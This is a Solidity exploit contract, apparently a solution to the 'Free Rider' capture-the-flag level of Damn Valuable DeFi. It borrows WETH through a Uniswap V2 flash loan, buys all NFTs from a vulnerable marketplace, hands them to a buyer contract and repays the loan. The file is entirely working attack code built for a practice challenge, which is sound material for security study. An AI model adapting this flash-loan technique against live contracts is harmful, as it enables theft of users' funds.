// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface Weth9X {
    function deposit() external payable;

    function withdraw(uint256) external;

    function transfer(address, uint256) external;

    function balanceOf(address) external returns (uint256);
}

interface UniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external returns (address);

    function token1() external returns (address);
}

/**
 * @title HackFreeRider
 * @dev 1. Take the flashloan of 15ETH from uniswap v2, which calls the fallback `uniswapV2Call` on this contract
 * @dev 2. Buy all the NFTs from marketplace to this address.
 * @dev 3. transfer them to Buyer's contract
 * @dev 4. repay the flashloan
 */
contract HackFreeRider {
    UniswapV2Pair public immutable _pool;
    FreeRiderNFTMarketplace public immutable _marketPlace;
    FreeRiderBuyer public immutable _buyer;
    DamnValuableNFT public _nftToken;

    constructor(
        address pool_,
        address payable market_,
        address buyer_,
        address nft_
    ) payable {
        _pool = UniswapV2Pair(pool_);
        _marketPlace = FreeRiderNFTMarketplace(market_);
        _buyer = FreeRiderBuyer(buyer_);
        _nftToken = DamnValuableNFT(nft_);
    }

    function flashloan(
        uint256 amount_,
        address tokenToBorrow_,
        uint256[] calldata tokenIds_
    ) external {
        address token0_ = _pool.token0();
        address token1_ = _pool.token1();
        uint256 amount0Out_ = token0_ == tokenToBorrow_ ? amount_ : 0;
        uint256 amount1Out_ = token1_ == tokenToBorrow_ ? amount_ : 0;

        _pool.swap(
            amount0Out_,
            amount1Out_,
            address(this),
            abi.encode(tokenToBorrow_, amount_, tokenIds_)
        );
    }

    function uniswapV2Call(
        address sender_,
        uint256,
        uint256,
        bytes calldata data_
    ) external {
        require(msg.sender == address(_pool), "INVALID_CALLER");
        require(sender_ == address(this), "INVALID_SENDER");
        (address token_, uint256 amount_, uint256[] memory tokenIds_) = abi
            .decode(data_, (address, uint256, uint256[]));

        Weth9X(token_).withdraw(amount_);
        uint256 fee_ = ((amount_ * 3) / 997) + 1;
        uint256 repayAmount_ = amount_ + fee_;

        _marketPlace.buyMany{value: amount_}(tokenIds_);

        for (uint256 i = 0; i < tokenIds_.length; i++)
            _nftToken.safeTransferFrom(
                address(this),
                address(_buyer),
                tokenIds_[i]
            );

        Weth9X(token_).deposit{value: repayAmount_}();
        Weth9X(token_).transfer(address(_pool), repayAmount_);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
